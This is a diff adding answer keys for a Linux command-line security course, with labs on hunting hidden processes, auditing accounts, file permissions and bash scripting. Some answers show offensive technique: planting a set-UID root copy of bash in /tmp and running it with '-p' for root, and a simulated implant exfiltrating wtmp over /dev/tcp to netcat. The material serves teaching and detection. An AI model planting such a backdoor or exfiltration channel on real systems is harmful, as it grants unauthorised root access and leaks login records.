+	xterm     187324     lab    0r  FIFO   0,22      0t0     0  2860331 /dev/shm/.rk/data (deleted)
+	tail      187325     lab    1w  FIFO   0,22      0t0     0  2860331 /dev/shm/.rk/data (deleted)
+
+   Hmm, three different processes all tied to deleted files under /dev/shm/.rk
+
+7. "lsof -i" shows all processes using the network. "lsof -i -t" outputs just their PIDs.
+
+        # for pid in $(lsof -i -t); do
+	      ls -l /proc/$pid/exe
+	  done | sed 's/.* -> //' | sort -u
+	/dev/shm/.rk/lsof (deleted)
+	/dev/shm/.rk/xterm (deleted)
+	/usr/bin/gnome-shell
+	/usr/bin/rpcbind
+	/usr/lib/systemd/systemd
+	/usr/sbin/avahi-daemon
+	/usr/sbin/chronyd
+	/usr/sbin/cupsd
+	/usr/sbin/dnsmasq
+	/usr/sbin/NetworkManager
+	/usr/sbin/sshd
+
+   We loop over the list of PIDs and output "ls -l /proc/$pid/exe". Then we use the same "sed ... | sort -u"
+   pipeline we used before. Again our suspicious processes are pretty easy to spot.
+
+8. Earlier we used "lsof -w +L1 | fgrep /dev/shm/.rk" to get information about our suspicious processes.
+   To kill them we can use some clever output substitution:
+
+        # lsof -w +L1 | fgrep /dev/shm/.rk
+        lsof      187316     lab  txt    REG   0,22   439368     0  2859945 /dev/shm/.rk/lsof (deleted)
+	xterm     187324     lab  txt    REG   0,22    38568     0  2860332 /dev/shm/.rk/xterm (deleted)
+	xterm     187324     lab    0r  FIFO   0,22      0t0     0  2860331 /dev/shm/.rk/data (deleted)
+	tail      187325     lab    1w  FIFO   0,22      0t0     0  2860331 /dev/shm/.rk/data (deleted)
+	# kill -9 $(lsof -w +L1 | fgrep /dev/shm/.rk | awk '{print $2}')
+	# lsof -w +L1 | fgrep /dev/shm/.rk
+
+   "awk" peels out the PIDs from field two and then we substitute the list of PIDs as arguments to "kill -9".
+   Checking again with "lsof" shows all the processes are dead.
+
+
+"Mine, Ours, Theirs"
+(Lab for Section 11, "Users, Groups, and Perms")
+================================================
+
+1. Some quick shell pipelines will get to the bottom of this!
+
+   -- Duplicate UIDs
+   
+        $ cut -d: -f3 Targets/passwd | sort | uniq -d
+	0
+	1000
+
+      If you want to see which accounts those actually are:
+
+        $ awk -F: '$3 == 0 || $3 == 1000' Targets/passwd
+	root:x:0:0:root:/root:/bin/bash
+	gotroot:x:0:0:boo!:/tmp:/bin/bash
+	evilhal:x:1000:1000:not me:/tmp:/bin/bash
+	hal:x:1000:1000:,,,:/home/hal:/bin/bash
+
+   -- Empty password hashes
+
+        $ awk -F: '$2 == ""' Targets/shadow
+	backup::18478:0:99999:7:::
+	evilhal::18551:0:99999:7:::
+
+   -- Service accounts with interactive shells
+
+        $ awk -F: '$3 < 1000 && $7 ~ /sh$/' Targets/passwd
+	root:x:0:0:root:/root:/bin/bash
+	backup:x:34:34:backup:/var/backups:/bin/bash
+	gotroot:x:0:0:boo!:/tmp:/bin/bash
+
+2. Hmmm, let's see what we have going on in ~/.sshsticky.
+
+        $ ls -ld .sshsticky/
+	drwxr-xr-t 2 lab lab 4096 May  1 12:25 .sshsticky/
+	$ cd .sshsticky/
+	$ ls -l
+	total 4
+	-r--r--r-- 1 root root 26 May  1 12:25 authorized_keys
+
+   So .sshsticky is owned by the "lab" user that we are currently running as. Notice also that the "sticky"
+   bit is set-- on a directory that means that only the owner of a file is allowed to delete the file.
+   And the authorized_keys file is owned by root. Seems like that might be a problem.
+
+        $ echo new data >authorized_keys
+	-bash: authorized_keys: Permission denied
+	$ rm authorized_keys
+	rm: remove write-protected regular file 'authorized_keys'? y
+	$ echo new data >authorized_keys
+	$ ls -l
+	total 4
+	-rw-r--r-- 1 lab lab 9 May  1 12:32 authorized_keys
+
+  As expected, we're not able to write new data into the root-owned authorized keys file. But how were we able
+  to delete the file with the sticky bit set on the directory? Turns out the sticky bit doesn't apply to the
+  owner (or group owner) of the directory-- that's why it shows up as a "t" in the "other" category of permissions.
+  The sticky bit works fine on directories like /tmp and /var/tmp because they are owned by root. But here
+  we are the directory owner so we can remove the root-owned authorized_keys and replace it with our own.
+
+  Just using regular ownerships and permissions is never effective in user home directories because ultimately
+  the user owns the directory and can just remove whatever obstacles you put in their way. However, you may want
+  to do a little reading about the "chattr +i" command...
+
+3. There are a couple of ways to go here. We can use absolute modes:
+
+        chmod 700 ~/.sshsticky
+	chmod 600 ~/.sshsticky/authorized_keys
+
+   Symbolic modes allow us to accomplish the mission with a single command:
+
+        chmod -R g-rwx,o-rwx ~/.sshsticky
+
+4. Your commands will probably look something like this:
+
+        # cp /bin/bash /tmp/bash
+	# chmod u+s /tmp/bash
+	# ls -l /tmp/bash
+	-rwsr-xr-x. 1 root root 1150672 May  1 12:42 /tmp/bash
+
+5. "find / -type f -perm /u+s,g+s"
+   "-type f" is helpful here so you don't list directories that happen to have set-GID set
+
+6. We can use egrep to filter out the normal directories:
+
+        # find / -type f -perm /u+s,g+s | egrep -v '/(s?bin|libexec)/'
+	/usr/lib/polkit-1/polkit-agent-helper-1
+	/tmp/bash
+
+   Turns out the "polkit" file is normal. But that and our /tmp/bash program really stand out now.
+
+7. If you execute a set-UID root shell you should end up as root right? Er, not so much...
+
+        [lab@LAB ~]$ id
+	uid=1000(lab) gid=1000(lab) groups=1000(lab),10(wheel) context=...
+	[lab@LAB ~]$ /tmp/bash
+	bash-4.4$ id
+	uid=1000(lab) gid=1000(lab) groups=1000(lab),10(wheel) context=...
+
+   There's a very brief mention of this behavior in the bash manual page, but you're probably better off
+   Google-ing the answer. The default behavior for bash (and most other shells) is that if the "effective UID"
+   that the shell starts as because of the set-UID bit is different from the "real UID" you logged in with,
+   then the shell drops the effective UID and runs as your real UID. This design choice was implemented to
+   help prevent a race-condition when executing set-UID scripts (never use set-UID scripts, use sudo).
+
+   However, bash has a (almost completely undocumented) "-p" option that let's you get root from your set-UID
+   root shell:
+
+        [lab@LAB ~]$ ls /root
+	ls: cannot open directory '/root': Permission denied
+	[lab@LAB ~]$ /tmp/bash -p
+	bash-4.4# ls /root
+	anaconda-ks.cfg  initial-setup-ks.cfg  rpmbuild  selinux
+	bash-4.4# id
+	uid=1000(lab) gid=1000(lab) euid=0(root) groups=1000(lab),10(wheel) ...
+
+   After running "/tmp/bash -p" I can list root's home directory and the "id" command shows my "effective UID"
+   ("euid") is root.
+
+
+
+Extreme Bonus Challenges
+========================
+
+1. Read the bash_history line by line. If it's a line with a timestamp, remove the leading "#" and use "date"
+   to make the human-readable timestamp. The timestamp gets stored in the variable $time. If it's a line with
+   a command, simply output $time, a tab, and the command line.
+
+        cat Targets/bash_history | while read line; do
+            if [[ $line =~ ^\#[0-9]+ ]]; then
+	        epoch=$(echo $line | tr -d \#)
+		time=$(date -d @$epoch "+%F %T")
+            else
+                echo -e $time\\t$line
+            fi
+        done
+
+    Note that we're using a full-blown "if ... then" inside the loop for readability. If we wanted, the inside
+    of the loop could be compacted into:
+
+        [[ $line =~ ^\#[0-9]+ ]] && time=$(date -d @$(echo $line | tr -d \#) "+%F %T") || echo -e $time\\t$line
+
+    Sometimes it's better to write code as a series of simple steps rather than showing off how complicated
+    you can make things.
+
+2. This one is challenging because it employs two nested loops that require different "IFS=" values for splitting
+   their inputs. The outer loop is processing the CSV file and needs "IFS=,". But the inner loop is munching
+   through the space-separated list of recipients. The trick is to run the inner loop in a sub shell so that it
+   can have its own IFS value without interfering with the outer loop:
+
+        IFS=,; cat Targets/maillog-oneline.csv | while read time sender recips subject attachment; do
+	    (IFS=' '; for r in $recips; do
+	             echo -e $time\\t$r\\t$subject\\t$attachment
+	    done)
+        done | sort -k2,2 -k1,1
+
+3. To make the output formatting look as much like "ps" as possible, we're using the "printf" operator.
+   One cool feature of bash's "printf" is that it can do date formatting, so we don't need to call out
+   to an extra "date" command.
+
+        epoch=$(date +%s)
+	ps -eww -o etimes,user,pid,ppid,command --no-headers |
+            while read time user pid ppid command; do
+                printf "%(%F %T)T  %-8s %8d %8d %s\n" $(( $epoch - $time )) $user $pid $ppid "$command"
+            done
+
+   Get the current date in Unix epoch seconds before the loop. Then read each line of "ps" output,
+   splitting out the individual fields. The start time of each process is the current $epoch time
+   minus the elapsed etimes seconds from "ps". The other fields we leave alone.
+
+4. Let's take a look at the output from the "file" command. Note that the content of the Pictures
+   directory is randomly generated, so yours might not match exactly.
+
+        $ file Targets/Pictures/* | head
+	[...]
+	Targets/Pictures/004.png:  PNG image data, ...
+	Targets/Pictures/005.jpg:  JPEG image data, ...
+	Targets/Pictures/006.gif:  GIF image data, ...
+	[...]
+
+   Conveniently, the "file" command puts the file type keyword first. By making clever choices for
+   "IFS=" we can auto-split the base file name, the extension, and the file type from "file" into
+   individual fields. To match against the file type, uppercase the extension and change the "JPG"s
+   into "JPEG"s. If there's a mismatch, output file, extension, and type.
+
+        $ IFS='.: '; file Targets/Pictures/* | while read file ext type junk; do
+	      match=$(echo $ext | tr a-z A-Z)
+	      [[ $match == "JPG" ]] && match='JPEG'
+	      [[ $match != $type ]] && echo $file.$ext: $type
+          done
+        Targets/Pictures/025.png: JPEG
+	Targets/Pictures/031.png: ASCII
+	Targets/Pictures/047.jpeg: PNG
+	Targets/Pictures/051.jpg: GIF
+	[...]
+
+5. Let's start with the "lsof +L1" data we saw earlier:
+
+        # lsof -w +L1 | fgrep /dev/shm/.rk 
+	lsof      8600            lab  txt    REG   0,22   439136     0    88567 /dev/shm/.rk/lsof (deleted)
+	xterm     8606            lab  txt    REG   0,22    38528     0    89682 /dev/shm/.rk/xterm (deleted)
+	xterm     8606            lab    0r  FIFO   0,22      0t0     0    89681 /dev/shm/.rk/data (deleted)
+	tail      8607            lab    1w  FIFO   0,22      0t0     0    89681 /dev/shm/.rk/data (deleted)
+
+   Looking closely at the fourth column, which is the file descriptor type, the /dev/shm/.rk/data file
+   is associated with file descriptor zero-- aka STDIN-- of the "xterm" process, and file descriptor one
+   (STDOUT) of the tail process. The "data" file itself is a "FIFO", which is basically a pipe in the form
+   of a special file on disk. So it appears that "tail" is feeding data to the "xterm" process through the
+   "data" pipe.
+
+   So where is "tail" getting the data from? How about just checking the command line of the process?
+
+        # cat /proc/8607/cmdline | tr \\000 ' '; echo
+        tail -f /var/log/wtmp
+
+   OK, "tail" is reading /var/log/wtmp (a log of who is logging into the machine) and feeding the data
+   to "xterm" through the "data" FIFO.
+
+   What does "xterm" do with the data? Let's check the file descriptors for the "xterm" process:
+
+        [root@LAB lab]# ls -l /proc/8606/fd
+	total 0
+	lr-x------. 1 lab lab 64 May  1 22:12 0 -> '/dev/shm/.rk/data (deleted)'
+	lrwx------. 1 lab lab 64 May  1 22:12 1 -> 'socket:[90160]'
+	l-wx------. 1 lab lab 64 May  1 22:12 2 -> /dev/null
+
+   Hmmm, STDOUT is a socket having socket number 90160. What can we do with that? "netstat" normally doesn't
+   display socket numbers, but the "-e" option adds this info to the normal output:
+
+        # netstat -antupe | grep 90160
+        tcp        1      0 192.168.10.136:51640    192.168.10.136:1337   CLOSE_WAIT  1000     90160    8606/xterm
+
+   So socket 90160 is a connection to port 1337 on our local IP addess (in the real world this would probably
+   be a connection to some other host, but we only have the one lab machine to play with at the moment).
+   What's listening on port 1337?
+
+        # netstat -antupe | grep 1337
+        tcp        1      0 192.168.10.136:51640    192.168.10.136:1337   CLOSE_WAIT  1000     90160    8606/xterm
+
+	tcp        0      0 192.168.10.136:1337     192.168.10.136:51640  FIN_WAIT2   1000     87777    8600/lsof
+
+   As you may have guessed, the "xterm" process is communicating with our final suspicious process, "lsof"
+   over the network.
+
+   And what's "lsof" doing with the data? Let's check the file descriptors for this process:
+
+        [root@LAB lab]# ls -l /proc/8600/fd
+	total 0
+	lr-x------. 1 lab lab 64 May  1 22:12 0 -> /dev/null
+	l-wx------. 1 lab lab 64 May  1 22:12 1 -> /dev/null
+	l-wx------. 1 lab lab 64 May  1 22:12 2 -> /dev/null
+	lrwx------. 1 lab lab 64 May  1 22:12 5 -> 'socket:[87777]'
+
+   Sadly, "lsof" is just discarding the data into "/dev/null". Hey, I had to do something with the data to
+   make the scenario run, but there didn't seem to be much point in actually saving it.
+
+   So to recap:
+
+       1) tail reads from /var/log/wtmp
+       2) tail writes the info into the "data" FIFO
+       3) "xterm" (actually the "cat" program) reads from the "data" FIFO
+       4) "xterm" writes data to the local machine on port 1337 (accomplished via ">/dev/tcp/.../1337")
+       5) this connects to "lsof" (actually "netcat") listening on 1337
+       6) "lsof" discards the data to /dev/null
+
